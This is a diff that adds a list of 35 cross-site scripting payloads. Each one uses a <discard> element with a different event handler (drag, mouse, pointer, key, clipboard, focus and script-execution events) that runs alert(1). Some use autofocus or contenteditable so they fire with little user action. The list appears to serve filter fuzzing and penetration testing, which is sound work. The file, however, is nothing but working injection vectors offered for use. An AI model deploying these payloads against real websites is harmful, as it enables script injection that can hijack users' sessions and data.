@@ -1,0 +1,35 @@
+<discard draggable="true" ondrag="alert(1)">test</discard>
+<discard draggable="true" ondragend="alert(1)">test</discard>
+<discard draggable="true" ondragenter="alert(1)">test</discard>
+<discard draggable="true" ondragleave="alert(1)">test</discard>
+<discard draggable="true" ondragstart="alert(1)">test</discard>
+<discard id=x tabindex=1 onactivate=alert(1)></discard>
+<discard id=x tabindex=1 onbeforeactivate=alert(1)></discard>
+<discard id=x tabindex=1 onbeforedeactivate=alert(1)></discard><input autofocus>
+<discard id=x tabindex=1 ondeactivate=alert(1)></discard><input id=y autofocus>
+<discard onafterscriptexecute=alert(1)><script>1</script>
+<discard onbeforescriptexecute=alert(1)><script>1</script>
+<discard onclick="alert(1)">test</discard>
+<discard oncontextmenu="alert(1)">test</discard>
+<discard oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<discard oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<discard ondblclick="alert(1)" autofocus tabindex=1>test</discard>
+<discard onkeydown="alert(1)" contenteditable>test</discard>
+<discard onkeypress="alert(1)" contenteditable>test</discard>
+<discard onkeyup="alert(1)" contenteditable>test</discard>
+<discard onmousedown="alert(1)">test</discard>
+<discard onmouseenter="alert(1)">test</discard>
+<discard onmouseleave="alert(1)">test</discard>
+<discard onmousemove="alert(1)">test</discard>
+<discard onmouseout="alert(1)">test</discard>
+<discard onmouseover="alert(1)">test</discard>
+<discard onmouseup="alert(1)">test</discard>
+<discard onmousewheel=alert(1)>requires scrolling
+<discard onpointerdown=alert(1)>XSS</discard>
+<discard onpointerenter=alert(1)>XSS</discard>
+<discard onpointerleave=alert(1)>XSS</discard>
+<discard onpointermove=alert(1)>XSS</discard>
+<discard onpointerout=alert(1)>XSS</discard>
+<discard onpointerover=alert(1)>XSS</discard>
+<discard onpointerrawupdate=alert(1)>XSS</discard>
+<discard onpointerup=alert(1)>XSS</discard>
